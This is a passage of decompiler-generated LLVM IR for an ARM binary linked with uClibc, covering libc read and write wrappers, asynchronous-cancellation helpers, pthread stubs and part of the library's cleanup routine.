  %v0_146f4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_146f4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_146f4 = load i32, i32* @r0, align 4
  ret i32 %v2_146f4

bb1:                                              ; preds = %entry
  %v0_146f8 = call i32 @__syscall_error()
  ret i32 %v0_146f8
}

define i32 @__GI___libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14704 = load i32, i32* @global_var_24f00.516, align 4
  %v2_14708 = icmp eq i32 %v3_14704, 0
  store i1 %v2_14708, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14708, label %dec_label_pc_14710, label %entry.dec_label_pc_1472c_crit_edge

entry.dec_label_pc_1472c_crit_edge:               ; preds = %entry
  %v3_1472c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1472c

dec_label_pc_14710:                               ; preds = %entry
  %v0_14720 = load i32, i32* @r0, align 4
  %v2_14720 = icmp ugt i32 %v0_14720, -4097
  %v7_14720 = icmp eq i32 %v0_14720, -4096
  store i1 %v7_14720, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14720, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_1472c, %dec_label_pc_14710
  %merge = phi i32 [ %v0_14720, %dec_label_pc_14710 ], [ %v0_14750, %dec_label_pc_1472c ], [ %v0_14760, %bb10 ], [ %v8_14770, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_14710
  %v0_14728 = call i32 @__syscall_error()
  br label %dec_label_pc_1472c

dec_label_pc_1472c:                               ; preds = %entry.dec_label_pc_1472c_crit_edge, %bb9
  %v3_1472c = phi i32 [ %v3_1472c.pre, %entry.dec_label_pc_1472c_crit_edge ], [ %v0_14728, %bb9 ]
  %v12_1472c = load i32, i32* @r3, align 4
  %v15_1472c = load i32, i32* @r7, align 4
  store i32 %v15_1472c, i32* %stack_var_-8, align 4
  %v18_1472c = load i32, i32* @lr, align 4
  %v0_14730 = call i32 @__libc_enable_asynccancel()
  store i32 %arg2, i32* @r1, align 4
  store i32 %v12_1472c, i32* @r3, align 4
  store i32 %v3_1472c, i32* @r7, align 4
  %v1_1474c = call i32 @__libc_disable_asynccancel(i32 %v0_14730)
  %v0_14750 = load i32, i32* @r7, align 4
  store i32 %v0_14750, i32* @r0, align 4
  %v2_14754 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14754, i32* @r7, align 4
  store i32 %v18_1472c, i32* @lr, align 4
  %v2_14758 = icmp ugt i32 %v0_14750, -4097
  %v7_14758 = icmp eq i32 %v0_14750, -4096
  store i1 %v7_14758, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14758, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_1472c
  %v0_14760 = call i32 @__syscall_error()
  %v0_14770 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14770, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_14770 = load i32, i32* @r1, align 4
  %v2_14770 = load i32, i32* @r4, align 4
  %v3_14770 = udiv i32 %v2_14770, 16384
  %v4_14770 = mul i32 %v2_14770, 262144
  %v5_14770 = or i32 %v3_14770, %v4_14770
  %v8_14770 = and i32 %v5_14770, %v1_14770
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_14750, { 0, 2, 3, 1 }
  uselistorder i32 %v0_14720, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1472c, { 1, 0 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_14784 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_14784, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_14784 = load i32, i32* @r0, align 4
  ret i32 %v2_14784

bb1:                                              ; preds = %entry
  %v0_14788 = call i32 @__syscall_error()
  ret i32 %v0_14788

; uselistorder directives
  uselistorder i1* @cpsr_c, { 1, 2, 3, 4, 0 }
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_14794 = load i32, i32* @global_var_24f00.516, align 4
  %v2_14798 = icmp eq i32 %v3_14794, 0
  br i1 %v2_14798, label %dec_label_pc_147a0, label %entry.dec_label_pc_147bc_crit_edge

entry.dec_label_pc_147bc_crit_edge:               ; preds = %entry
  %v3_147bc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_147bc

dec_label_pc_147a0:                               ; preds = %entry
  %v0_147b0 = load i32, i32* @r0, align 4
  %v2_147b0 = icmp ugt i32 %v0_147b0, -4097
  br i1 %v2_147b0, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_147bc, %dec_label_pc_147a0
  %merge = phi i32 [ %v0_147b0, %dec_label_pc_147a0 ], [ %v0_147e0, %dec_label_pc_147bc ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_147a0
  %v0_147b8 = call i32 @__syscall_error()
  br label %dec_label_pc_147bc

dec_label_pc_147bc:                               ; preds = %entry.dec_label_pc_147bc_crit_edge, %bb8
  %v3_147bc = phi i32 [ %v3_147bc.pre, %entry.dec_label_pc_147bc_crit_edge ], [ %v0_147b8, %bb8 ]
  %v6_147bc = load i32, i32* @r1, align 4
  %v15_147bc = load i32, i32* @r7, align 4
  store i32 %v15_147bc, i32* %stack_var_-8, align 4
  %v18_147bc = load i32, i32* @lr, align 4
  %v0_147c0 = call i32 @__libc_enable_asynccancel()
  store i32 %v6_147bc, i32* @r1, align 4
  store i32 %v3_147bc, i32* @r7, align 4
  %v1_147dc = call i32 @__libc_disable_asynccancel(i32 %v0_147c0)
  %v0_147e0 = load i32, i32* @r7, align 4
  store i32 %v0_147e0, i32* @r0, align 4
  %v2_147e4 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_147e4, i32* @r7, align 4
  store i32 %v18_147bc, i32* @lr, align 4
  %v2_147e8 = icmp ugt i32 %v0_147e0, -4097
  br i1 %v2_147e8, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_147bc
  %v0_147f0 = call i32 @__syscall_error()
  ret i32 %v0_147f0

; uselistorder directives
  uselistorder i32 %v0_147e0, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 5, 4, 11, 7, 6, 10, 1, 0, 9, 3, 2, 8 }
  uselistorder label %dec_label_pc_147bc, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_14800 = load i32, i32* %r0.global-to-local, align 4
  %v1_14800 = and i32 %v0_14800, 2
  %v2_14800 = icmp eq i32 %v1_14800, 0
  %v3_14804 = load i32, i32* @r4, align 4
  store i32 %v3_14804, i32* %stack_var_-16, align 4
  br i1 %v2_14800, label %dec_label_pc_1480c, label %dec_label_pc_14880

dec_label_pc_1480c:                               ; preds = %entry
  %v0_1480c = call i32 @__aeabi_read_tp()
  store i32 %v0_1480c, i32* %r0.global-to-local, align 4
  %v1_14810 = add i32 %v0_1480c, -1036
  %v2_14810 = inttoptr i32 %v1_14810 to i32*
  %v3_14810 = load i32, i32* %v2_14810, align 4
  %v1_14814 = add i32 %v0_1480c, -1168
  store i32 %v1_14814, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14818

dec_label_pc_14818:                               ; preds = %dec_label_pc_1484c.dec_label_pc_14818_crit_edge, %dec_label_pc_1480c
  %v0_14824 = phi i32 [ %v0_14824.pre, %dec_label_pc_1484c.dec_label_pc_14818_crit_edge ], [ %v1_14814, %dec_label_pc_1480c ]
  %v0_14818 = phi i32 [ %v0_1484c, %dec_label_pc_1484c.dec_label_pc_14818_crit_edge ], [ %v3_14810, %dec_label_pc_1480c ]
  %v1_14818 = and i32 %v0_14818, -3
  store i32 %v1_14818, i32* %r7.global-to-local, align 4
  store i32 %v0_14818, i32* %r4.global-to-local, align 4
  store i32 %v1_14818, i32* @r1, align 4
  %v1_14824 = add i32 %v0_14824, 132
  store i32 %v1_14824, i32* @r2, align 4
  %v1_1482823 = inttoptr i32 %v1_14824 to i32*
  %v2_1482824 = load i32, i32* %v1_1482823, align 4
  %v3_1482c26 = icmp uge i32 %v2_1482824, %v0_14818
  store i1 %v3_1482c26, i1* %cpsr_c.global-to-local, align 1
  %v9_1482c32 = icmp eq i32 %v2_1482824, %v0_14818
  br i1 %v9_1482c32, label %dec_label_pc_14834, label %dec_label_pc_1484c

dec_label_pc_14834:                               ; preds = %dec_label_pc_14818, %dec_label_pc_14834.dec_label_pc_14828_crit_edge
  %v0_1483433 = phi i32 [ %v1_1482c.pre, %dec_label_pc_14834.dec_label_pc_14828_crit_edge ], [ %v0_14818, %dec_label_pc_14818 ]
  store i32 %v0_1483433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_14844 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_14844, label %dec_label_pc_14848, label %dec_label_pc_14834.dec_label_pc_14828_crit_edge

dec_label_pc_14834.dec_label_pc_14828_crit_edge:  ; preds = %dec_label_pc_14834
  %v0_14828.pre = load i32, i32* @r2, align 4
  %v1_1482c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14828 = inttoptr i32 %v0_14828.pre to i32*
  %v2_14828 = load i32, i32* %v1_14828, align 4
  %v3_1482c = icmp uge i32 %v2_14828, %v1_1482c.pre
  store i1 %v3_1482c, i1* %cpsr_c.global-to-local, align 1
  %v9_1482c = icmp eq i32 %v2_14828, %v1_1482c.pre
  br i1 %v9_1482c, label %dec_label_pc_14834, label %dec_label_pc_1484c

dec_label_pc_14848:                               ; preds = %dec_label_pc_14834
  %v0_14848 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1484c

dec_label_pc_1484c:                               ; preds = %dec_label_pc_14818, %dec_label_pc_14834.dec_label_pc_14828_crit_edge, %dec_label_pc_14848
  %v0_1484c = phi i32 [ %v0_14848, %dec_label_pc_14848 ], [ %v2_1482824, %dec_label_pc_14818 ], [ %v2_14828, %dec_label_pc_14834.dec_label_pc_14828_crit_edge ]
  %v1_1484c = phi i32 [ %v0_14848, %dec_label_pc_14848 ], [ %v0_14818, %dec_label_pc_14818 ], [ %v1_1482c.pre, %dec_label_pc_14834.dec_label_pc_14828_crit_edge ]
  %v3_1484c = icmp uge i32 %v0_1484c, %v1_1484c
  store i1 %v3_1484c, i1* %cpsr_c.global-to-local, align 1
  %v9_1484c = icmp eq i32 %v0_1484c, %v1_1484c
  br i1 %v9_1484c, label %dec_label_pc_14874.preheader, label %dec_label_pc_1484c.dec_label_pc_14818_crit_edge

dec_label_pc_1484c.dec_label_pc_14818_crit_edge:  ; preds = %dec_label_pc_1484c
  %v0_14824.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14818

dec_label_pc_14874.preheader:                     ; preds = %dec_label_pc_1484c
  %v0_148741 = load i32, i32* %r7.global-to-local, align 4
  %v1_148742 = and i32 %v0_148741, 12
  store i32 %v1_148742, i32* @r3, align 4
  %v2_148783 = icmp ugt i32 %v1_148742, 3
  store i1 %v2_148783, i1* %cpsr_c.global-to-local, align 1
  %v7_148785 = icmp eq i32 %v1_148742, 4
  br i1 %v7_148785, label %dec_label_pc_14858.lr.ph, label %dec_label_pc_14874.preheader.dec_label_pc_14880.loopexit_crit_edge

dec_label_pc_14874.preheader.dec_label_pc_14880.loopexit_crit_edge: ; preds = %dec_label_pc_14874.preheader
  %v1_14884.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14880.loopexit

dec_label_pc_14858.lr.ph:                         ; preds = %dec_label_pc_14874.preheader
  %v0_1485c.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_1485c = add i32 %v0_1485c.pre, 132
  %v2_14870 = inttoptr i32 %v1_1485c to i32*
  br label %dec_label_pc_14858

dec_label_pc_14858:                               ; preds = %dec_label_pc_14858.lr.ph, %dec_label_pc_14858
  %v0_14858 = phi i32 [ %v0_148741, %dec_label_pc_14858.lr.ph ], [ %v3_14870, %dec_label_pc_14858 ]
  store i32 %v0_14858, i32* @r2, align 4
  store i32 %v1_1485c, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_14870 = load i32, i32* %v2_14870, align 4
  store i32 %v3_14870, i32* %r7.global-to-local, align 4
  %v1_14874 = and i32 %v3_14870, 12
  store i32 %v1_14874, i32* @r3, align 4
  %v7_14878 = icmp eq i32 %v1_14874, 4
  br i1 %v7_14878, label %dec_label_pc_14858, label %dec_label_pc_14874.dec_label_pc_14880.loopexit_crit_edge

dec_label_pc_14874.dec_label_pc_14880.loopexit_crit_edge: ; preds = %dec_label_pc_14858
  %v2_14878 = icmp ugt i32 %v1_14874, 3
  store i1 %v2_14878, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_14880.loopexit

dec_label_pc_14880.loopexit:                      ; preds = %dec_label_pc_14874.preheader.dec_label_pc_14880.loopexit_crit_edge, %dec_label_pc_14874.dec_label_pc_14880.loopexit_crit_edge
  %v1_14884.pre = phi i32 [ %v1_14884.pre.pre, %dec_label_pc_14874.preheader.dec_label_pc_14880.loopexit_crit_edge ], [ %v1_1485c, %dec_label_pc_14874.dec_label_pc_14880.loopexit_crit_edge ]
  %v2_14880.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_14880

dec_label_pc_14880:                               ; preds = %dec_label_pc_14880.loopexit, %entry
  %v1_14884 = phi i32 [ %v1_14884.pre, %dec_label_pc_14880.loopexit ], [ %v0_14800, %entry ]
  %v2_14880 = phi i32 [ %v2_14880.pre, %dec_label_pc_14880.loopexit ], [ %v3_14804, %entry ]
  store i32 %v2_14880, i32* @r4, align 4
  ret i32 %v1_14884

; uselistorder directives
  uselistorder i32 %v3_14870, { 1, 2, 0 }
  uselistorder i32 %v1_1485c, { 0, 2, 1 }
  uselistorder i32 %v0_14848, { 1, 0 }
  uselistorder i32 %v1_1482c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_14818, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder label %dec_label_pc_14880.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_14858, { 1, 0 }
  uselistorder label %dec_label_pc_1484c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_14834, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_14888 = load i32, i32* @r4, align 4
  store i32 %v3_14888, i32* %stack_var_-24, align 4
  store i32 ptrtoint (i32* @global_var_d46c.521 to i32), i32* %r8.global-to-local, align 4
  %v0_14890 = call i32 @__aeabi_read_tp()
  %v1_14894 = add i32 %v0_14890, -1036
  %v2_14894 = inttoptr i32 %v1_14894 to i32*
  %v3_14894 = load i32, i32* %v2_14894, align 4
  store i32 %v3_14894, i32* %r6.global-to-local, align 4
  %v1_14898 = add i32 %v0_14890, -1168
  store i32 %v1_14898, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r8.global-to-local, align 4
  %v1_148a046 = or i32 %v3_14894, 2
  store i32 %v1_148a046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_148a449 = icmp eq i32 %v1_148a046, %v3_14894
  br i1 %v9_148a449, label %dec_label_pc_14950, label %dec_label_pc_148ac

dec_label_pc_148ac:                               ; preds = %entry, %bb.dec_label_pc_148ac_crit_edge
  %v0_148b0 = phi i32 [ %v0_148b0.pre, %bb.dec_label_pc_148ac_crit_edge ], [ %v1_14898, %entry ]
  %v1_148a051 = phi i32 [ %v1_148a0, %bb.dec_label_pc_148ac_crit_edge ], [ %v1_148a046, %entry ]
  %v0_148b450 = phi i32 [ %v1_148e0, %bb.dec_label_pc_148ac_crit_edge ], [ %v3_14894, %entry ]
  store i32 %v1_148a051, i32* @r1, align 4
  %v1_148b0 = add i32 %v0_148b0, 132
  store i32 %v1_148b0, i32* %r2.global-to-local, align 4
  store i32 %v0_148b450, i32* %r4.global-to-local, align 4
  %v1_148b834 = inttoptr i32 %v1_148b0 to i32*
  %v2_148b835 = load i32, i32* %v1_148b834, align 4
  store i32 %v2_148b835, i32* @r3, align 4
  %v3_148bc37 = icmp uge i32 %v2_148b835, %v0_148b450
  store i1 %v3_148bc37, i1* %cpsr_c.global-to-local, align 1
  %v9_148bc43 = icmp eq i32 %v2_148b835, %v0_148b450
  br i1 %v9_148bc43, label %dec_label_pc_148c4, label %dec_label_pc_148dc

dec_label_pc_148c4:                               ; preds = %dec_label_pc_148ac, %dec_label_pc_148c4.dec_label_pc_148b8_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_148d4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_148d4, label %dec_label_pc_148d8, label %dec_label_pc_148c4.dec_label_pc_148b8_crit_edge

dec_label_pc_148c4.dec_label_pc_148b8_crit_edge:  ; preds = %dec_label_pc_148c4
  %v0_148b8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_148bc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_148b8 = inttoptr i32 %v0_148b8.pre to i32*
  %v2_148b8 = load i32, i32* %v1_148b8, align 4
  store i32 %v2_148b8, i32* @r3, align 4
  %v3_148bc = icmp uge i32 %v2_148b8, %v1_148bc.pre
  store i1 %v3_148bc, i1* %cpsr_c.global-to-local, align 1
  %v9_148bc = icmp eq i32 %v2_148b8, %v1_148bc.pre
  br i1 %v9_148bc, label %dec_label_pc_148c4, label %dec_label_pc_148dc

dec_label_pc_148d8:                               ; preds = %dec_label_pc_148c4
  %v0_148d8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_148d8, i32* @r3, align 4
  br label %dec_label_pc_148dc

dec_label_pc_148dc:                               ; preds = %dec_label_pc_148ac, %dec_label_pc_148c4.dec_label_pc_148b8_crit_edge, %dec_label_pc_148d8
  %v1_148e0 = phi i32 [ %v0_148d8, %dec_label_pc_148d8 ], [ %v2_148b835, %dec_label_pc_148ac ], [ %v2_148b8, %dec_label_pc_148c4.dec_label_pc_148b8_crit_edge ]
  %v1_148dc = load i32, i32* %r6.global-to-local, align 4
  %v3_148dc = icmp uge i32 %v1_148e0, %v1_148dc
  store i1 %v3_148dc, i1* %cpsr_c.global-to-local, align 1
  %v9_148dc = icmp eq i32 %v1_148e0, %v1_148dc
  br i1 %v9_148dc, label %dec_label_pc_148e8, label %bb

bb:                                               ; preds = %dec_label_pc_148dc
  store i32 %v1_148e0, i32* %r6.global-to-local, align 4
  %v1_148a0 = or i32 %v1_148e0, 2
  store i32 %v1_148a0, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_148a4 = icmp eq i32 %v1_148a0, %v1_148e0
  br i1 %v9_148a4, label %dec_label_pc_14950, label %bb.dec_label_pc_148ac_crit_edge

bb.dec_label_pc_148ac_crit_edge:                  ; preds = %bb
  %v0_148b0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_148ac

dec_label_pc_148e8:                               ; preds = %dec_label_pc_148dc
  %v0_148e8 = load i32, i32* %r5.global-to-local, align 4
  %v1_148e8 = and i32 %v0_148e8, -69
  store i32 %v1_148e8, i32* @r3, align 4
  %v2_148ec = icmp ugt i32 %v1_148e8, 9
  store i1 %v2_148ec, i1* %cpsr_c.global-to-local, align 1
  %v7_148ec = icmp eq i32 %v1_148e8, 10
  br i1 %v7_148ec, label %dec_label_pc_148f4, label %dec_label_pc_14950

dec_label_pc_148f4:                               ; preds = %dec_label_pc_148e8
  %v1_148f8 = load i32, i32* %r7.global-to-local, align 4
  %v2_148f8 = add i32 %v1_148f8, 544
  %v3_148f8 = inttoptr i32 %v2_148f8 to i32*
  store i32 -1, i32* %v3_148f8, align 4
  %v0_148fc = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_148fc, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14900

dec_label_pc_14900:                               ; preds = %dec_label_pc_14934.dec_label_pc_14900_crit_edge, %dec_label_pc_148f4
  %v0_14904 = phi i32 [ %v0_14904.pre, %dec_label_pc_14934.dec_label_pc_14900_crit_edge ], [ %v0_148fc, %dec_label_pc_148f4 ]
  %v0_14900 = load i32, i32* %r7.global-to-local, align 4
  %v1_14900 = add i32 %v0_14900, 132
  %v2_14900 = inttoptr i32 %v1_14900 to i32*
  %v3_14900 = load i32, i32* %v2_14900, align 4
  store i32 %v0_14904, i32* %r2.global-to-local, align 4
  store i32 %v3_14900, i32* %r4.global-to-local, align 4
  %v1_1490c = or i32 %v3_14900, 16
  store i32 %v1_1490c, i32* @r1, align 4
  %v1_1491022 = inttoptr i32 %v0_14904 to i32*
  %v2_1491023 = load i32, i32* %v1_1491022, align 4
  %v3_1491425 = icmp uge i32 %v2_1491023, %v3_14900
  store i1 %v3_1491425, i1* %cpsr_c.global-to-local, align 1
  %v9_1491431 = icmp eq i32 %v2_1491023, %v3_14900
  br i1 %v9_1491431, label %dec_label_pc_1491c, label %dec_label_pc_14934

dec_label_pc_1491c:                               ; preds = %dec_label_pc_14900, %dec_label_pc_1491c.dec_label_pc_14910_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_1492c = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_1492c, label %dec_label_pc_14930, label %dec_label_pc_1491c.dec_label_pc_14910_crit_edge

dec_label_pc_1491c.dec_label_pc_14910_crit_edge:  ; preds = %dec_label_pc_1491c
  %v0_14910.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_14914.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_14910 = inttoptr i32 %v0_14910.pre to i32*
  %v2_14910 = load i32, i32* %v1_14910, align 4
  %v3_14914 = icmp uge i32 %v2_14910, %v1_14914.pre
  store i1 %v3_14914, i1* %cpsr_c.global-to-local, align 1
  %v9_14914 = icmp eq i32 %v2_14910, %v1_14914.pre
  br i1 %v9_14914, label %dec_label_pc_1491c, label %dec_label_pc_14934

dec_label_pc_14930:                               ; preds = %dec_label_pc_1491c
  %v0_14930 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14934

dec_label_pc_14934:                               ; preds = %dec_label_pc_14900, %dec_label_pc_1491c.dec_label_pc_14910_crit_edge, %dec_label_pc_14930
  %v0_14934 = phi i32 [ %v0_14930, %dec_label_pc_14930 ], [ %v2_1491023, %dec_label_pc_14900 ], [ %v2_14910, %dec_label_pc_1491c.dec_label_pc_14910_crit_edge ]
  %v1_14934 = phi i32 [ %v0_14930, %dec_label_pc_14930 ], [ %v3_14900, %dec_label_pc_14900 ], [ %v1_14914.pre, %dec_label_pc_1491c.dec_label_pc_14910_crit_edge ]
  %v3_14934 = icmp uge i32 %v0_14934, %v1_14934
  store i1 %v3_14934, i1* %cpsr_c.global-to-local, align 1
  %v9_14934 = icmp eq i32 %v0_14934, %v1_14934
  br i1 %v9_14934, label %dec_label_pc_1493c, label %dec_label_pc_14934.dec_label_pc_14900_crit_edge

dec_label_pc_14934.dec_label_pc_14900_crit_edge:  ; preds = %dec_label_pc_14934
  %v0_14904.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_14900

dec_label_pc_1493c:                               ; preds = %dec_label_pc_14934
  store i32 116, i32* @r3, align 4
  %v0_14944 = load i32, i32* %r8.global-to-local, align 4
  %v2_14944 = add i32 %v0_14944, 116
  %v3_14944 = inttoptr i32 %v2_14944 to i32*
  %v4_14944 = load i32, i32* %v3_14944, align 4
  store i32 %v4_14944, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_14944)
  %v0_14950.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14950

dec_label_pc_14950:                               ; preds = %entry, %bb, %dec_label_pc_148e8, %dec_label_pc_1493c
  %v0_14950 = phi i32 [ %v1_148e0, %dec_label_pc_148e8 ], [ %v0_14950.pre, %dec_label_pc_1493c ], [ %v3_14894, %entry ], [ %v1_148e0, %bb ]
  %v2_14954 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_14954, i32* @r4, align 4
  ret i32 %v0_14950

; uselistorder directives
  uselistorder i32 %v0_14930, { 1, 0 }
  uselistorder i32 %v1_14914.pre, { 0, 2, 1 }
  uselistorder i32 %v1_148a0, { 1, 2, 0 }
  uselistorder i32 %v1_148dc, { 1, 0 }
  uselistorder i32 %v1_148e0, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_148bc.pre, { 1, 0 }
  uselistorder i32 %v0_148b450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 0, 6, 10, 7, 9, 8, 1, 2 }
  uselistorder i32 -69, { 1, 0 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_14950, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_14934, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1491c, { 1, 0 }
  uselistorder label %dec_label_pc_148dc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_148c4, { 1, 0 }
  uselistorder label %dec_label_pc_148ac, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_14974 = add i32 %tmp, 4
  %v4_14974 = inttoptr i32 %v3_14974 to i32*
  store i32 %arg3, i32* %v4_14974, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_14980 = icmp eq i32 %arg2, 0
  br i1 %v2_14980, label %.thread1, label %bb

bb:                                               ; preds = %entry
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %v3_14998 = call i32 @__libc_errno()
  ret i32 %v3_14998

; uselistorder directives
  uselistorder i32 ()* @__libc_errno, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_149cc.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_149a8 = load i32, i32* @r4, align 4
  store i32 %v3_149a8, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_149cc

dec_label_pc_149cc:                               ; preds = %dec_label_pc_149cc.dec_label_pc_149cc_crit_edge, %dec_label_pc_149cc.lr.ph
  %v1_149cc = phi i32 [ %v1_149d8, %dec_label_pc_149cc.dec_label_pc_149cc_crit_edge ], [ 0, %dec_label_pc_149cc.lr.ph ]
  %v0_149cc = phi i32 [ %v0_149cc.pre, %dec_label_pc_149cc.dec_label_pc_149cc_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_21d10.338 to i32), i32 -8), %dec_label_pc_149cc.lr.ph ]
  %v4_149cc = mul i32 %v1_149cc, 4
  %v5_149cc = add i32 %v4_149cc, %v0_149cc
  %v6_149cc = inttoptr i32 %v5_149cc to i32*
  %v7_149cc = load i32, i32* %v6_149cc, align 4
  call void @__pseudo_branch(i32 %v7_149cc)
  %v0_149d8 = load i32, i32* %r4.global-to-local, align 4
  %v1_149d8 = add i32 %v0_149d8, -1
  store i32 %v1_149d8, i32* %r4.global-to-local, align 4
  %v2_149d8 = icmp eq i32 %v0_149d8, 0
  br i1 %v2_149d8, label %dec_label_pc_149e0, label %dec_label_pc_149cc.dec_label_pc_149cc_crit_edge

dec_label_pc_149cc.dec_label_pc_149cc_crit_edge:  ; preds = %dec_label_pc_149cc
  %v0_149cc.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_149cc

dec_label_pc_149e0:                               ; preds = %dec_label_pc_149cc
  %v0_149e4.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_149e4 = add i32 %v0_149e4.pre, 2004
  %v3_149e4 = inttoptr i32 %v2_149e4 to i32*
